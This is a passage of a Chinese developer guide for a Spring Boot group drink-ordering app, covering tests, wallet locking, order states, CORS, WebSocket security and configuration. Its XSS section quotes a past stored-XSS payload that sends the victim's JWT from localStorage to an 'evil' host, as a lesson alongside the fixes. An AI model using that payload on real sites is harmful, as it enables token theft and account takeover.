| 其他 | `TimeZoneConfigTest`（1） | 啟動時的時區設定：先切到 UTC（免得主機本來就是 Asia/Taipei 而假性通過），再確認 `applyDefaultTimeZone()` 把 JVM 預設時區設為 Asia/Taipei，不經過 `main()` |
| 其他 | `RedisKeyNamespaceTest`（6） | Redis 鍵命名空間的格式（小寫英文開頭、小寫英數與連字號、最長 32、不含冒號）；未設定與空白視為不加前綴；格式不合規一律拒絕；prod 未設定即拒絕（ADR-0013） |
| 其他 | `NamespacedRedisKeySerializerTest`（7） | 鍵序列化器只加前綴，不改 hash 欄位與 value；還原的往返；另一命名空間的鍵原樣保留；null 直通；格式不合規拒絕建立（ADR-0013） |
| 其他 | `RedisConfigWiringTest`（8，不連線） | 模板接線：主要字串模板與通用模板只包鍵，hash 欄位與 value 不加；`globalStringRedisTemplate` 不加前綴；prod 未設定或格式錯誤拒絕啟動；fbtoken 守衛以 `@Qualifier` 使用全域模板（ADR-0013） |
| 其他 | `RedisKeyNamespaceIntegrationTest`（6，真實 Redis） | 伺服器上的實際鍵名：加鎖與 Lua 解鎖對同一把帶前綴的鍵生效；兩個命名空間的同名鍵互不干擾；fbtoken 不加前綴；使用隨機命名空間，不呼叫 FLUSH（ADR-0013） |
| 應用程式 | `DemoApplicationTests`（1） | Spring context 能否載入 |

除了上表中載入 Spring context 的 11 個類別（`DemoApplicationTests`、`AuthorizationTest`、`AuthorizationRouteInventoryTest`、`GroupOrderSecurityTest`、`GroupCheckoutConcurrencyTest`、`RatingConcurrencyTest`、`WalletConcurrencyTest`、`ImageStorageServiceTest`、`WebSocketWiringTest`、`GroupItemRulesTest`、`StoreSuspensionIntegrationTest`）之外，其餘 85 個類別不載入 Spring context，是純邏輯或 Mockito 測試。
新增純規則時請放在 `service/order/`、`service/wallet/`、`common/` 這類目錄，不要為了測一條規則去啟整個 context。

> 以上既有測試都已驗證「把修補改回舊寫法時會失敗」——`AuthorizationTest` 在還原 IDOR 時 3 個、還原 S-6 時 2 個轉紅，`WalletConcurrencyTest` 改回 `findById` 時 2 個轉紅，`ItemSpecResolverTest` 把防竄改改回「照單全收」時 4 個轉紅，`GroupCheckoutConcurrencyTest` 拿掉品項列鎖或結帳狀態守衛時各 1 個轉紅。
> 新增測試時請照做，在修補前後各跑一次，確認它真的抓得到回歸，否則只是裝飾。
> 2026-10-12 與本輪新增的測試（`IdempotencyServiceTest`、`ExclusiveJobRunnerTest`、`GeoBoundsTest`、`RequestIdFilterTest`、`AuthorizationRouteInventoryTest`、`BrandSummaryJsonTest`、`StompAuthInterceptorTest`、`WebSocketWiringTest`、`PageSizeClampTest`、`UploadControllerTest`、`OrderNoFormatTest`、`TimeZoneConfigTest`，以及 `LoginAttemptLimiterTest` 的新增案例）已於 2026-10-13 做過還原驗證：共 39 組故意破壞（把修補改回舊寫法，或改壞規則），每一組都讓至少一支對應的測試轉紅，對照表見 README「還原驗證」。這些類別並非每個測試都被破壞過：GeoBoundsTest、RequestIdFilterTest、AuthorizationRouteInventoryTest 各有未破壞的案例，LoginAttemptLimiterTest 只破壞了新增的 2 個案例，確切範圍以 README 為準。同一次 CI 內若同時破壞會互相遮蔽的兩處，必須單獨再跑一次，否則看不出各自是否被抓到。破壞用的 commit 標題以 `scratch:` 開頭，只存在於暫存分支 `main-cbduag`（可刪除），不屬於 PR 分支。
> 2026-10-15 的 N13（權杖版本）已在本機還原驗證：`AccountStatus` 的 8 組破壞（版本、角色、已刪除、品牌與門市、大小寫、顧客比對到門市列）與 `User` 改密碼／撤銷的 3 組破壞，都讓至少一支對應的測試轉紅。本機以真實的 `AccountStatus` 搭配 stub 執行，stub 中的兩個 `User` 方法逐字取自 `User.java`。`JwtAuthenticationFilterTest`、`StompAuthInterceptorTest`、`JwtTokenVersionTest` 的新案例需要 Spring、Mockito 或 jjwt，本機無法執行，已由 CI 確認（run 38836496498，全數通過）；README 的「還原驗證」表已於 2026-10-15 補入本機結果（見「2026-10-15 還原驗證」）。

### 另外兩層驗證（都在 CI 上跑）

`mvn test` 抓不到「服務跑起來才會現形」的問題，所以還有：

```bash
cd scripts && npm install
node e2e-verify.js      # API 端對端，12 個面向（逐項通過數由腳本輸出）
node ui/run-all.js      # 43 個 HTML 頁普掃（55 次載入）+ 點餐／轉盤／揪團／搜尋分頁四條主線＋管理員審核＋內嵌事件控制項（Playwright）
```

`.github/workflows/ci.yml` 會依序跑完這三層。**改完動到序列化、交易邊界或前端流程的
程式碼後，請至少跑一次第二三層**——九次 `LazyInitializationException` 裡有兩次
（下單完成頁、揪團成員清單）是單獨 curl 端點會過、實際走流程才炸的。

## ⚠️ 使用者可控字串：寫入端白名單、輸出端轉義

`stores.store_name` / `cover_url`、商品 `logo_url`、`users.name`、品項／訂單備註都是店家或顧客
自己寫進去的資料，而前端大量用 `innerHTML` 拼字串。這條路徑曾完全沒有防護：任何 BRAND 帳號
（`POST /api/brand-auth/register` 是公開端點，不需驗證）把封面設成
`x" onerror="fetch('https://evil/?t='+localStorage.getItem('token'))`，就能在每一位訪客的首頁
執行它（JWT 就放在 `localStorage`）；顧客把名字改成 `<img src=x onerror=…>` 也能對門市後台做同樣的事
（2026-10-11 複審的 X-1／X-2，已修）。

- **寫入端**：圖片網址一律過 `common/SafeImageUrl.normalize()`——只允許 `http(s)://` 或單層
  `/…` 站內路徑，含 `"`、`'`、`<`、`>`、空白或控制字元一律 400。接到門市封面、品牌 logo、
  商品 logo、會員頭像四個寫入點；新增 `*Url` 欄位時請照做。
- **輸出端**：每個頁面／每支 store JS 都有自己的區域 `escapeHtml`（沿用 `Brand/js/hq-menu-api.js`
  的實作，不新增共用模組以免動到離線載入順序）。任何插進 HTML 的值都要先過它，包含屬性值。
- **不要**把資料拼進 `onclick="fn('…')"` 這種 JS 字串：只換單引號擋不住結尾是反斜線的字串，
  同一層還是 HTML。改用 `addEventListener` 或 `data-*` + 事件代理傳值。
- **inline script 要另驗語法**：`node scripts/ui/check-inline-scripts.js [file.html…]`（不帶參數
  就掃 `frontend/` 下所有 HTML）；`node --check` 只看得到獨立 `.js`，看不到寫在 HTML 裡的程式碼。
- **防禦的另一層**：`SecurityConfig` 現在有 `X-Content-Type-Options`/`frame-ancestors 'none'`/
  `Referrer-Policy`/`Permissions-Policy`/HSTS，CSP 由 `app.security.csp.enabled`（**預設 false**）
  與 `app.security.csp.policy` 控制，由 `common/SecurityHeadersFilter` 加上；要真的收緊
  `script-src` 得先把 inline event handler 外部化，否則只能整頁破相。

其他本輪一起補的防呆：登入／OTP 端點走 `service/LoginAttemptLimiter`（`check(scope, identity)`，
Redis 不可用時退回本地計數，預設 10 次／300 秒，超過回 429）；prod profile 下 `sms.mode` 非 `firebase`
直接拒絕啟動，`MOCK_TOKEN` 只在非 prod 生效，`DemoDataSeeder` 在 prod 一律不植入
（比照 `JwtUtils.assertProductionSecret`）；`PUT /api/stores/status` 只接受 `active` / `closed`。

## 資料庫（27 張表）

重要表格：
- `brands`, `stores` — 品牌與門市帳號（品牌含 `approval_status`，N-28）
- `users`, `user_auth_providers` — 顧客帳號與社群綁定
- `user_addresses` — 使用者常用地址（多筆，支援預設）
- `product_templates` — 飲品模板（品牌層級）
- `product_categories` — 分類（Entity: `MenuCategory`）
- `spec_master`, `brand_spec_setting` — 規格設定（甜度/冰量/大小）
- `topping_master`, `brand_topping_setting` — 加料設定
- `orders`, `order_items`, `order_item_toppings` — 訂單系統（`orders` Entity: `GroupOrder`）
- `user_coupons` — 優惠券系統（轉盤抽獎，直接記錄品牌+飲品）
- `order_ratings` — 訂單星級評分（`order_reviews` 已移除）
- `transaction_records` — 錢包帳本（TOPUP/ESCROW/REFUND/FINAL_PAY/REPAYMENT）
- `cart_items` — 購物車（有門市限制，含 qty 欄位）
- `user_favorites` — 收藏店家
- `admins` — 管理員帳號（N-28），與顧客、品牌、門市分開存放

完整 schema 請見 `DATABASE.md`。

## 訂單狀態流程

```
OPEN → SUBMITTED → PREPARING → READY → COMPLETED
  └────────┴───────────┴→ REJECTED（分店拒絕）
  ↘ CANCELLED（顧客取消）
```

⚠️ **`PREPARING` 是實際存在的狀態**（`AnalyticsService.acceptOrder` 設定，寫入 `preparing_at`），
舊版文件漏列。`completeProduction` 只接受 PREPARING → READY，`acceptOrder` 可從 OPEN 或
SUBMITTED 進入 PREPARING。

揪團流程：揪團主建立 → 產生 token → 其他人用 token 加入 → 揪團主統一提交

### 揪團退款與可見性（團長 2026-10-13 定案，2026-10-14 補充）

判斷與退款去向集中在 `service/order/GroupRefundPolicy`（純函式，有單元測試）；`GroupOrderService` 只負責接上資料庫與列鎖。

- **送單前（OPEN）**：團員已結帳的品項可自行取消並退款，退回該品項**當下的付款方式**。錢包付款退回錢包；現金、信用卡的退款入團長帳號（2026-10-14 團長確認），團員再向團長領回；品項在送單前已取消，因此無後續收款與對帳。
- **送單後（SUBMITTED）**：團員不可自行取消或退款，一律由團長操作，退款**入團長帳號**。團長整單取消時，送單後已付的金額同樣入團長帳號。
- **截單（LOCKED）**：團員不可自行取消（團長 2026-10-14 確認）。團長仍可移除品項或整單取消，直到店家接單為止（見 `GroupRefundPolicy.wholeGroupCancellable`）。
- **店家接單後（PREPARING 以後）**：不可整單取消或刪除（409），不可移除品項，也不產生退款；已送單的揪團不可改回 OPEN 或 LOCKED。
- **團內資料僅供成員檢視**：成員 = 團長，或已在團內有品項的團員。非成員（含未登入）持分享連結只拿到店家、狀態、建立時間等基本欄位（`getGroupOrderDTOByToken` 的 `outsiderView`；不含品項、地址、備註、金額、團長與分享 token），須先加入揪團才能看到團內資料。
- **已知缺口（已收斂）**：`/topic/group/{token}` 的 SUBSCRIBE 已限定為成員（團長，或已在團內有品項的團員；N12），持分享連結但未加入者無法訂閱，前端也改為確認成員身分後才訂閱。事件內容仍是品項 id、成員 userId 與狀態（不含姓名與金額）。尚未處理：已建立的訂閱不會因成員身分改變、帳號停用或 token 過期而即時中斷，直到連線結束。

⚠️ **顧客只能走 `service/order/OrderStatusGuard` 允許的轉換**（`OPEN\|SUBMITTED → CANCELLED`、
`SUBMITTED → PAID`，後者是舊前端「已付款」通知）。`OrderController` 的狀態端點原本只驗
「是不是發起人」就 `setStatus`，任何登入者都能把訂單直接改成 `COMPLETED`（拿去評分）、
把已結帳的 `SUBMITTED` 改回 `OPEN`（重新開放加點再結一次）或偽造付款狀態。
門市端的 `acceptOrder` / `completeProduction` / `finalizeOrder` 本來就有各自的守衛，不要動。

## 錢包/支付邏輯

帳本 `transaction_records` 的 `type` 只放 token，人看的字放 `description`
（常數在 `service/wallet/TxType`）：

- `TOPUP` 儲值 ／ `PAYMENT` 下單扣款 ／ `ESCROW` 團長代墊託管款
- `REFUND` 取消或拒單退款 ／ `REPAYMENT` 團員付出 ／ `REPAYMENT_RECEIVED` 團長收取
- 支付方式：`WALLET`（餘額）或 `CASH`

⚠️ `type` 一度被當成顯示字串，實際存 `"消費扣款\n個人訂單 #12 結帳扣款"`，
前端再自己 split、用 `includes('補款')` 猜種類。**讀取一律經 `TxDisplay.normalize()`**
（純函式，會把舊格式拆回 type／description 並給出中文 label），不要直接信 `type` 原始值，
也不要在前端再寫一份判斷。舊資料還在庫裡，改判斷邏輯時 `TxDisplayTest`（7 個）會擋著。

⚠️ 錢包帳本 `GET /api/wallet/transactions` **必須分頁**（`UserProfileService.MAX_PAGE_SIZE = 100`）。
原本是把整份帳本撈進記憶體再 `subList` 切頁——查十筆卻讀了全部，
和 `/api/stores/orders` 當初那個問題一模一樣。

⚠️ 扣款要**先存訂單再扣款**。原本順序相反，帳本說明寫 `"個人訂單 #" + order.getId()`
而訂單還沒 persist，`getId()` 必為 null，正式資料庫裡 52 筆全長成「個人訂單 # 結帳扣款」。

### ⚠️ 餘額異動必須鎖列

所有金流都經由 `TransactionRecordService.updateStoreCredit()`（GroupOrderService 有 10 處
呼叫）與 `UserProfileService.topUp()`，兩者都必須用
`UserRepository.findByIdForUpdate()`（`SELECT ... FOR UPDATE`），**不可改回 `findById`**。

餘額是「讀出 → 相加 → 寫回」，沒有列鎖時併發請求會互相覆蓋。實測 20 個併發各儲值 10 元，
最終只入帳 70 元，且 `transaction_records` 總額（120）與 `users.balance`（70）對不起來——
對含金流的系統代表無法對帳。

`WalletConcurrencyTest` 會擋住這個回歸（已驗證：改回 `findById` 時兩個測試都會失敗）。
新增任何動到 `balance` 的流程時，一律走上述兩個方法，不要自己讀寫餘額。

### ⚠️ 列鎖會被一級快取架空，必須在持鎖狀態下重讀

`updateStoreCredit` 裡 `findByIdForUpdate` 之後那行
`entityManager.refresh(user, PESSIMISTIC_WRITE)` **不可刪**。

呼叫端若在扣款前已經讀過同一個 `User`（揪團結帳會先碰 `item.getUser()`），
該 entity 已在 persistence context 裡，此時 `findByIdForUpdate` 雖然確實取得列鎖，
Hibernate 仍回傳快取中那個「上鎖之前」的實例——餘額是舊值，
併發時每個交易都用同一個舊餘額計算，最後一個寫入獲勝。

**不能只用 `entityManager.refresh(user)`**：MySQL 預設 REPEATABLE READ 之下，
普通 SELECT 讀的是交易快照（快照在本交易第一次讀取時就固定），refresh 回來還是舊值；
只有鎖定讀會看到最新已提交版本，所以必須指定 `PESSIMISTIC_WRITE`。
（這一版修補是被 `WalletConcurrencyTest` 打回來才改對的。）

### ⚠️ 「檢查狀態 → 扣款 → 改狀態」一定要先鎖列

金流流程都是 read-modify-write，沒有列鎖時併發請求會重複扣款：

| 流程 | 必須用的查詢 | 未修補前實測（都應只發生一次 $35）|
|------|-------------|------------------|
| 團員結帳 `getMemberUnpaidTotalAndMarkPaid` | `OrderItemRepository.findByGroupOrderAndUserAndStatusForUpdate` | 帳本 −175、餘額只掉 35 |
| 團長結帳 `checkout` | `GroupOrderRepository.findByShareTokenForUpdate` ＋狀態守衛 | 8 個併發全部成功、扣 8 次 |
| 補款 `repayToHost` | 同團員結帳（狀態帶 UNPAID/ESCROWED）| 扣了 175 |
| 取消退款 `handleGroupOrderCancellation` | `GroupOrderRepository.findByIdForUpdate` ＋ `findByGroupOrderIdForUpdate` | escrow 退了 280 |

`GroupCheckoutConcurrencyTest`（6）守住這四條。

### ⚠️ 評分彙總：先鎖門市列，且彙總要用單一 SQL

`stores.avg_rating` / `review_count` 是反正規化欄位。寫評分的順序**必須**是
「先 `StoreRepository.findByIdForUpdate` 取排他鎖 → 再 insert `order_ratings`」。

反過來的話：insert 會因為外鍵在 `stores` 那列加共享鎖，隨後的 update 要升級成排他鎖，
兩個併發交易互相等待——實測 12 個併發評分只有 2 筆成功，10 筆死鎖。

彙總本身也**不可以**在 Java 端 `countByStoreId` 之後 `setReviewCount` 再 save：
REPEATABLE READ 之下那個 COUNT 讀的是本交易快照，看不到別人剛提交的評分，
每個交易都用自己的舊數字覆蓋回去（實測 12 筆評分只算出 4 筆）。
改用 `StoreRepository.refreshRatingAggregate` 的單一 `UPDATE ... (SELECT COUNT/AVG ...)`，
子查詢讀的是最新已提交版本。`RatingConcurrencyTest`（2）守住這兩條。

### ⚠️ 優惠券的消耗要原子

`applyCouponToItem` 必須用 `UserCouponRepository.markUsedIfUnused()`
（`UPDATE ... WHERE status = 'unused'`，受影響列數 0 就代表已被用掉），
**不可改回 `markCouponAsUsed()` 那種先 findById 檢查再 save 的寫法**——
那是 read-check-write，實測兩個品項同時套同一張券時兩邊都會過、一張券折了兩次。
而且要在動品項**之前**先消耗，輸的那一方才不會已經改了資料才發現券沒了。

⚠️ 擋住重複退款的是**列鎖**，不是狀態守衛。實測只拿掉取消流程的列鎖、留著
「已取消就 return」的守衛，escrow 仍退了 140——沒有鎖時讀到的狀態本身就是舊的。
狀態守衛是第二層保險，不要把它當成防線。

## ⚠️ `open-in-view: false`：交易外不可碰 LAZY 關聯

`application.yml` 設 `spring.jpa.open-in-view: false`，**請保持關閉**（開著會讓 session
撐到 view 渲染完，掩蓋 N+1 並長時間佔用連線）。代價是：Service 方法回傳後 session 就關了，
之後任何對 LAZY 關聯的存取都會拋 `LazyInitializationException` → 固定 500。

已經踩過同一顆雷九次，歸納為下面四種型態：

1. **Service 內組 Map 時讀 LAZY 關聯** — `PublicService.buildStoreCard`、
   `ProductService.getProductDetail`、`StoreService.getProfile` 都會讀 `store.getBrand()`。
   修法：方法（或整個 class）加 `@Transactional(readOnly = true)`。
   `StoreService.getProfile` 是門市後台每一頁頁首都會打的端點，壞掉時整個後台的
   營業狀態永遠停在「讀取中…」。
2. **Controller 直接回傳 JPA entity** — `GET /api/stores/{storeId}/v2` 與
   `/api/stores/brand/{brandId}` 原本回傳 `Store`，Jackson 序列化 `brand` / `region`
   proxy 時 session 早已關閉，**必定 500**。這種加 `@Transactional` 沒用（序列化發生在交易之後），
   要在交易內就轉成純 Map。兩支都已改走 `StoreService.toMap()`。

3. **Controller 拿 entity 出來自己組 Map** — `OrderController.buildOrderResponse` 讀
   `order.getStore().getStoreName()`，而 Controller 不在交易內。這種要嘛讓查詢
   `@EntityGraph` 把關聯一起載入（`findWithStoreAndInitiatorById`），要嘛整段移進 Service。
4. **Service 回傳 entity、Controller 才轉 DTO** — `getGroupOrderByOrderId` 回
   `Optional<GroupOrder>`，Controller 拿到後才呼叫 `convertToDTO`，此時交易早就結束。
   已改成 `getGroupOrderDTOByOrderId`，轉換留在交易內。

**不要從 Controller 直接回傳 JPA entity。** 除了這個問題，entity 還會把整個物件圖攤開來，
且欄位一旦新增就自動外流（目前靠 `passwordHash` 上的 `@JsonProperty(WRITE_ONLY)` 擋著，
那是最後一道防線，不該是唯一一道）。

**同理，也不要把 entity 當成 Service 的回傳值再到外面轉換**——轉換寫在哪裡，
就決定了它有沒有交易可用。

> 這顆雷至今踩過九次，其中「下單完成頁」與「揪團成員清單」兩處是實際點過畫面才發現的：
> 端點單獨 curl 會過（資料剛好沒有那個關聯），要照使用者的路徑走完整流程才會現形。

這類錯誤**單元測試抓不到、要實際打端點才會現形**。改完動到序列化或關聯的程式碼後，
跑一次涵蓋所有 GET 端點的普掃（起服務後逐一 curl，看有沒有 5xx 或 body `code=500`）比較實在。

## 品項規則抽在 `service/order/`，不要抄回 Service 裡

`GroupOrderService` 太大，三條與金額／防竄改有關的規則已抽成純函式，
新增或修改品項邏輯時請直接用這三個，不要在 Service 內再寫一份：

| 類別 | 規則 |
|------|------|
| `ItemSpecResolver` | 商品的某個規格類型只有唯一選項時（例如熱飲只賣熱的），**一律採用該選項，不採信用戶端送來的值**。這是防竄改規則，不是顯示邏輯 |
| `ItemHash` | 決定「什麼算同一杯」。配料**必須先排序**再串接，否則同樣的兩杯會算出不同 hash 而不會合併顯示 |
| `CouponEligibility` | 券的品牌／指定商品適用範圍；已付款的品項不可再套券 |

⚠️ `ItemSpecResolver` 那段原本在 `addItem` 與 `updateItem` 各寫一次，兩邊行為
只差在「沒帶欄位時要不要動」。抽出來之後 `addItem` 用 `resolveOrEmpty`（欄位不可為 null）、
`updateItem` 用 `resolve`（沒帶就不呼叫），規則本身共用同一份。

這三支都有純邏輯測試（`src/test/java/com/example/demo/service/order/`，19 個、跑 0.05 秒），
改規則時測試會跟著紅——已驗證把防竄改改回「照單全收」時 4 個測試失敗。

## ⚠️ 列表端點一律要分頁

`GET /api/stores/orders` 曾經一次回傳該門市的**全部歷史訂單**：壓測實測 6,666 筆、
2.1 MB，50 併發下 p50 從 0.14 秒惡化到 2.7 秒、p99 超過 10 秒，比其他端點慢 50~60 倍。
查詢本身不慢（索引有生效），慢在序列化與傳輸整份歷史。

現已改為 `Pageable`：`page`（預設 0）、`size`（預設 50、上限 200 由
`AnalyticsService.MAX_PAGE_SIZE` 把關），回傳 `{ orders, page, size, total, totalPages, hasNext }`。
前端 `StoreAPI.getOrders()` 會解包成陣列以相容既有畫面，需要分頁資訊請用 `getOrdersPage()`。

**新增任何會隨營運時間累積的列表端點（訂單、交易紀錄、評價）時，一律帶 Pageable。**

## 統一回應格式

```json
{ "code": "200", "msg": "success", "data": { ... } }
```
- 前端依 `code === 200` 或 `code === '200'` 判斷成功
- 401/403 自動跳轉登入頁

## 本機開發設定

**資料庫與 Redis 皆由本機 Docker 提供。**

1. `docker compose up -d` — 啟動 MySQL 8（`localhost:3306`）與 Redis 7（`localhost:6379`）
2. `mvn spring-boot:run` — `application.yml` 的預設值已對應上述容器，不需額外設定
3. 首次啟動且資料表為空時，`DemoDataSeeder` 會植入示範品牌／門市／飲品／顧客
   （帳號見 README，密碼皆為 `demo1234`）。正式環境務必 `DEMO_DATA_ENABLED=false`
4. Cloudinary 憑證為選填：填了就上傳雲端，沒填則由 `ImageStorageService` 自動改存
   本機 `uploads/`（以 `/uploads/**` 提供），因此不需任何第三方帳號即可完整運作
5. 本機需明確設定 `SMS_MODE=mock`（或 application-local.yml 的 `sms.mode: mock`），跳過 Firebase 驗證，不需要 `serviceAccountKey.json`。`sms.mode` 的預設是 `firebase`（N15，fail-closed）
6. 啟動埠：`8082`；Swagger UI：`http://localhost:8082/swagger-ui.html`
7. 容器映像（選用）：`docker build -t joindrink .`。映像內含 `frontend/`；資料庫與 Redis 需由外部提供。部署細節見 `docs/DEPLOYMENT.md`
8. 管理員後台（N-28）：本機要建立管理員，設定 `ADMIN_BOOTSTRAP_USERNAME` 與 `ADMIN_BOOTSTRAP_PASSWORD_HASH`（BCrypt 雜湊，不接受明文；例如以 `htpasswd -nbBC 10 "" <密碼>` 產生後去掉前面的冒號）再啟動。帳號已存在時不會覆寫密碼；本機未設定時不會建立管理員。登入頁為 `/Admin/login.html`（後端 8082 或本機前端 5500 皆可）。

設定值一律走 `${ENV_VAR:本機預設值}`，`application.yml` 內不再有任何明文密鑰。

## CORS 白名單

由 `app.cors.allowed-origins`（`application.yml`）單一來源提供，
`SecurityConfig`（HTTP）與 `WebSocketConfig`（STOMP handshake）**共用同一份**，
可用環境變數 `CORS_ALLOWED_ORIGINS` 覆寫：

預設清單（與 `application.yml` 的 `${CORS_ALLOWED_ORIGINS:…}` 預設值完全一致）：

- `http://localhost:5173`
- `http://127.0.0.1:5500`
- `http://localhost:5500`
- `http://localhost:8082`
- `http://127.0.0.1:8082`

本機額外的來源（Live Server 改用 5501／5502、IDE 內建伺服器的臨時埠、3000、8080 等）不再寫在預設值裡，改放在 `application-local.yml`（範本見 `application-local.yml.example`），或在啟動時設定 `CORS_ALLOWED_ORIGINS`。

⚠️ 曾因 WebSocket 端獨立寫成 `setAllowedOriginPatterns("*")`，
與 HTTP 端白名單自相矛盾而完全對外放行。新增來源請只改設定檔，不要在程式碼中另寫一份。
`WebConfig` 也曾有第三份 `addCorsMappings("/**").allowedOrigins("*")`，被 Spring Security
的 CORS filter 遮蔽而未生效，但同樣自相矛盾，已移除。

## WebSocket / STOMP 安全

`/ws-cart` 的 SockJS handshake 走 CORS 白名單；STOMP 層由
`WebSocketConfig.configureClientInboundChannel` 掛上 `StompAuthInterceptor`，攔截：

- **CONNECT**：必須帶 `Authorization: Bearer <jwt>`，驗證簽章與到期時間後，帳號仍須存在且未刪除（N7）、權杖版本須為帳號目前版本（N13），才綁為連線的 Principal
- **SUBSCRIBE**：每次都重新檢查 token 是否仍在有效期內、帳號是否仍存在（N7）、權杖版本是否仍為帳號目前版本（N13）；`/topic/order/{id}` 僅限該訂單的**發起人或參與者**
  （參與者以 `order_items` 判定，揪團成員才看得到自己團的狀態）；
  `/topic/group/{token}` 僅限該揪團的**成員**（團長，或已在團內有品項的團員；N12），持分享連結者不可訂閱
- **SEND**：客戶端直接送出的 SEND 一律拒絕（N5）。SimpleBroker 會把它轉給訂閱者，放行就能偽造推播

⚠️ 先前完全沒有攔截器，且 `orderId` 是連續整數可直接列舉，任何人都能旁觀他人訂單狀態。
前端（`group_order.html`、`order_details.html`、`order_confirm.html`）已改為在
`stompClient.connect()` 第一個參數帶入 token，新增 STOMP 頁面時別忘了。

## 前端架構

- **Customer 前台** (`/frontend/Customer/`)：顧客端，含登入/註冊（`auth/` 8頁）、首頁、地圖、店家列表、購物車、結帳、訂單、揪團、個人資料等 12 頁，共 20 HTML
- **Brand 後台** (`/frontend/Brand/`)：品牌管理後台，含 Dashboard、菜單、規格加料、門市管理、財務、口碑監控、熱銷趨勢（7 頁）
- **Store 後台** (`/frontend/store/`)：門市後台，含訂單管理、庫存、營業時間、配送設定、財務報表、評分（12 頁）
- **Admin 後台** (`/frontend/Admin/`)：管理員審核（N-28）：登入、待審品牌清單（核准、退件）、已核准品牌（停用、恢復、查看分店）、分店（停用、恢復）；分頁與登出；4 頁。權杖存在 `adminToken`
- 前端 JS 以模組化方式分割（每支 API 獨立 `*-api.js` 或 `api-*.js`）
- JWT 存於 `localStorage`，每次請求自動帶入 `Authorization: Bearer <token>`
- 側邊欄由 `store-shell-boot.js`（head 最早載入，防閃爍）+ `store-shell.js`（RWD 響應式 Shell）管理

## 特殊功能

- **優惠券轉盤**：遊戲化抽獎，優惠券圖片由 Java 2D + NotoSansTC 字型動態生成後上傳 Cloudinary
- **區域定價**：同品牌不同地區可有不同分類加價（`brand_region_category_pricing`）
- **商品快照**：訂單建立時儲存當下商品/價格快照，避免日後價格異動影響歷史訂單
- **帳號合併**：社群登入與傳統帳號可合併（`/api/auth/merge/*`）
- **優惠券到期排程**：`CouponExpiryScheduler` 自動處理到期
- **即時推播**：WebSocket/STOMP 推送訂單狀態與揪團品項異動（非 SSE，見上方說明）
- **圖片儲存**：一律走 `ImageStorageService`，**不要直接呼叫 `cloudinary.uploader()`**。
  有憑證上傳 Cloudinary，沒有則存本機 `uploads/` 並以 `/uploads/**` 提供，
  讓專案不需任何第三方帳號即可完整運作
- **GroupOrder V2**：完整揪團流程（品項 CRUD、套用優惠券、結帳、補款）
- **常用地址管理**：使用者可儲存多筆常用地址（`user_addresses`），結帳時快速選用

## ⚠️ 前端資源一律放 `frontend/vendor/`，不要再引入 CDN

Tailwind、Leaflet、Lucide、Chart.js、SockJS/STOMP、QRCode、Font Awesome、Bootstrap Icons、
Material Symbols 都已收進 `frontend/vendor/`（`scripts/vendor-assets.sh` 可重新抓取）。

原因：這些原本全從 CDN 載，網路不通時會出現 `L is not defined` / `tailwind is not defined`，
地圖、結帳、揪團、個人資料四頁直接壞掉，Tailwind 掛掉更是整頁沒樣式。

`scripts/ui/harness.js` 的 `E2E_OFFLINE=1` 會擋掉所有連外請求，**CI 固定開著**。
新增 `<script src="https://...">` 會讓普掃在斷網下轉紅。

沒收進來的（刻意）：內文字型（載不到只是退回系統字型，Noto Sans TC 光 subset 就 315 個檔）、
地圖圖磚、Nominatim 地址搜尋、Firebase 社群登入——後三者本質上是線上服務。

## ⚠️ 時區只在 `config/TimeZoneConfig` 設定一次

`TimeZone.setDefault(Asia/Taipei)` 必須放在 `@PostConstruct`，**不可搬回 `main()`**——
測試不會呼叫 `main()`（`@SpringBootTest` 直接建 context），時區就會和正式啟動不一致。

在 UTC 的機器上（CI 就是）會疊出兩次 ＋8：`DemoDataSeeder` 明確用
`ZoneId.of("Asia/Taipei")` 一次，`spring.jpa.properties.hibernate.jdbc.time_zone`
寫入時再換算一次，示範資料的 `created_at` 因此落在 16 小時後的未來，
永遠排在錢包帳本最上面。本機時區剛好是 Asia/Taipei 時兩次換算會互相抵銷，
所以這個問題**只有 CI 抓得到**，要重現得把 MySQL 換成 UTC 容器。

## 重要注意事項

- `application.yml` 已全面改為 `${ENV_VAR:預設值}`，**不要把明文密鑰寫回去**
- `serviceAccountKey.json` 與 `application-local.yml` 已在 `.gitignore`
- DB DDL：`spring.jpa.hibernate.ddl-auto`（本機 `update`，production 需改 `validate`/`none`）。目前沒有遷移工具，Flyway 導入的做法見 `docs/adr/0008-schema-migrations.md`
  - ⚠️ YAML 冒號後**一定要有空格**。曾寫成 `ddl-auto:validate` 導致
    `spring.jpa.hibernate` 被解析成字串、Spring 綁定失敗而無法啟動。
- `sms.mode` 預設為 firebase（N15，fail-closed）。設定鍵是頂層的 `sms.mode`，**不是** `app.sms.mode`
  （`AuthService` 讀的是 `${sms.mode:firebase}`，放錯層級會靜默 fallback 成 firebase）
- `app.reset_password_url` 目前是死設定，程式中沒有任何地方讀取
- `jwt.secret` **至少 64 個字元**（UTF-8 原始位元組，HS512 需 ≥512 bits）。
  長度不足時 `JwtUtils` 的 `@PostConstruct` 會讓應用**啟動失敗**並印出明確訊息。
  - 曾因 `signWith(alg, String)` 會先把 secret 做 Base64 **解碼**，70 字元的預設值
    只剩 52 bytes，導致「註冊成功但一登入就 500」。現改用
    `Keys.hmacShaKeyFor(secret.getBytes(UTF_8))`，字面長度即金鑰長度。
  - 更換 `JWT_SECRET` 會使既有 token 全部失效，使用者需重新登入
- Token 有效期讀 `jwt.expiration`（預設 24h）。曾因 `JwtUtils` 寫死
  `@Value("604800000")` 而變成 7 天、設定檔完全不生效
- `GlobalExceptionHandler` 已區分用戶端錯誤：找不到路由→404、缺參數/型別錯→400、
  method 不支援→405；500 只回泛用訊息，**內部例外細節一律只寫進 log 不外流**
- Redis 為真實服務（Docker），已移除 `embedded-redis`。`RedisCartService` /
  `DailySpinService` 直接依賴 `StringRedisTemplate`，Redis 沒跑會在呼叫時失敗；
  `RedisLockService` 則有本機鎖 fallback
- `order_reviews` 表與 Entity 已從程式碼移除，評分統一使用 `order_ratings`
- 轉盤實際路由為 `/api/coupons/spin`（執行）、`/api/coupons/spin-status`（狀態查詢），品牌列表為 `/api/game-wheel/brands`，**非** `/api/daily-spin/*`
- GroupOrder V2 刪除路由為 `/api/group-orders/token/{token}`（加 `token/` 前綴），`/api/group-orders/{token}` 為 GET 查詢


## 2026-10-11 第二輪複查後新增的不變量

- **第三方登入的新帳號只能經 `POST /api/auth/social-signup` 建立**（先驗證手機 OTP，再建立帳號）。`socialLogin` 不得再以請求中未驗證的 `phone` 寫入使用者；全新手機會回 201，前端導向 `verify-phone.html?type=social-signup`。
